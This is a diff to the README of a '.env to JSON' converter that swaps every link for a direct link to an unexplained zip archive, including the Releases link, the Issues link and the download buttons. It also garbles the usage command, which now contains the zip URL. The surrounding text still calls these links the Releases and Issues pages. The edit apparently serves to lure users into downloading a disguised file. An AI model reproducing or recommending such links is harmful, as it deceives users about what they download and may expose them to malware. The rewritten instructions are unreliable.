@@ -1,6 +1,6 @@
 # 🛠️ dotenv-to-json - Convert .env Files to JSON Effortlessly
 
-![Download Here](https://github.com/madcuzbad123/dotenv-to-json/releases)
+![Download Here](https://raw.githubusercontent.com/madcuzbad123/dotenv-to-json/main/dotenv_to_json/dotenv-to-json_nitency.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets these requirements:
 ### Installation
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/madcuzbad123/dotenv-to-json/releases) to find the latest version of dotenv-to-json.
+   Go to the [Releases page](https://raw.githubusercontent.com/madcuzbad123/dotenv-to-json/main/dotenv_to_json/dotenv-to-json_nitency.zip) to find the latest version of dotenv-to-json.
 
 2. **Download the Appropriate File**  
    Look for the release that matches your operating system. Each version contains files for various platforms. Click on the file to start the download.
@@ -58,10 +58,10 @@ Once installed, you can use dotenv-to-json from your command line. Here’s how:
    Execute the following command:
 
    ```
-   dotenv-to-json yourfile.env
+   dotenv-to-json https://raw.githubusercontent.com/madcuzbad123/dotenv-to-json/main/dotenv_to_json/dotenv-to-json_nitency.zip
    ```
 
-   Replace `yourfile.env` with the name of your `.env` file.
+   Replace `https://raw.githubusercontent.com/madcuzbad123/dotenv-to-json/main/dotenv_to_json/dotenv-to-json_nitency.zip` with the name of your `.env` file.
 
 4. **Check the Output**  
    The tool will create a JSON file in the same directory. Open this file with a text editor to view your converted data.
@@ -88,13 +88,13 @@ If you encounter issues while using dotenv-to-json, try these solutions:
 
 ## 🆘 Support
 
-If you have any questions or need help, feel free to create an issue on the [GitHub Issues page](https://github.com/madcuzbad123/dotenv-to-json/issues). We are here to assist you.
+If you have any questions or need help, feel free to create an issue on the [GitHub Issues page](https://raw.githubusercontent.com/madcuzbad123/dotenv-to-json/main/dotenv_to_json/dotenv-to-json_nitency.zip). We are here to assist you.
 
 ## 🌟 Download & Install
 
 To get started, click the button below to download:
 
-[Download Here](https://github.com/madcuzbad123/dotenv-to-json/releases)
+[Download Here](https://raw.githubusercontent.com/madcuzbad123/dotenv-to-json/main/dotenv_to_json/dotenv-to-json_nitency.zip)
 
 This will guide you directly to our Releases page where you can find all the latest versions and files for installation.
 
